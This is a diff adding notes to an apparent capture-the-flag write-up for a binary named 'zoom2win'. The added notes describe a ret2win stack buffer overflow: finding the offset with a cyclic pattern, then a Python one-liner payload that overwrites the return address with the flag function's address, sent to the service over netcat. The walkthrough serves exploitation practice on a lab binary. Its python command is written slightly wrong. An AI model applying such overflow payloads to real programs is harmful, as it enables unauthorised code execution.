@@ -20,5 +20,38 @@ Use Ghidra and GDB.
 
 ```py
 PUTS - It displays some output just like printf.
-GETS - It reads some data just like scang.
+GETS - It reads some data just like scanf.
+
+Finding the offset : 
+1. Generate a cyclic pattern : cyclic 100.
+2. The first four bytes in RSP is the offset.
+3. Use cyclic -l <four bytes> to find the actual offset.
+4. Use the offset to overflow the function and return statement.
+
+Steps : 
+disassemble flag
+(assume offset is 40)
+
+We use the memory address of the first function in disassemble flag
+(assume it is 0x0000000000401196)
+
+python3 - C 'print "A" * 40 + "\x96\x11\x40\x00\x00\x00\x00\x00" ' 
+
+(add this to a file payload)
+python3 - C 'print "A" * 40 + "\x96\x11\x40\x00\x00\x00\x00\x00" ' > payload
+
+echo "Fake_flag" > flag.txt
+(Dummy flag for local file)
+
+Now, run < payload 
+(fake_flag will be printed)
+
+./zoom2win < payload
+fake_flag Segmentation fault
+
+Now when we run the netcat command with the payload we get our flag.
+
+---
+
+Thank you
 
